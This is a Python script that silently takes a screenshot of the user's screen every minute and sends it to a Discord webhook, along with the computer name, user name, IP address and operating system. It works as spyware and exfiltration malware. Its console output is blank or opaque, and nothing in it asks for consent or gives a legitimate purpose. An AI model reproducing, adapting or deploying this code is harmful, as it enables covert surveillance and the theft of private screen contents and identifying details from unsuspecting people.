import os
import sys
import requests
import socket
import time
from io import BytesIO
from PIL import ImageGrab
from discord_webhook import DiscordWebhook, DiscordEmbed
import schedule

def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def screenshot():
    img = ImageGrab.grab()
    return img

def send_screenshot_to_discord(webhook_url):
    img = screenshot()

    with BytesIO() as img_byte:
        img.save(img_byte, 'PNG')
        img_byte.seek(0)

        computer_name = os.environ['COMPUTERNAME']
        user_name = os.environ['USERNAME']
        ip_address = get_ip_address()
        os_name = f"{sys.platform}"
        title = f"{computer_name} - {user_name} - {ip_address}"
        description = f"OS Platform : {os_name}"
        
        webhook = DiscordWebhook(url=webhook_url)
        embed = DiscordEmbed(title=title, description=description, color='03b2f8')
        webhook.add_embed(embed)
        webhook.add_file(file=img_byte.read(), filename='0x48524.png')
        response = webhook.execute()
        return response.status_code

webhook_url = "WEBHOOK_HERE"
status_code = send_screenshot_to_discord(webhook_url)

def send_screenshot_periodically(webhook_url):
    status_code = send_screenshot_to_discord(webhook_url)
    if status_code == 200:
        print("")
    else:
        print("2770: {}".format(status_code))

schedule.every(1).minutes.do(send_screenshot_periodically, webhook_url)

while True:
    schedule.run_pending()
    time.sleep(1)
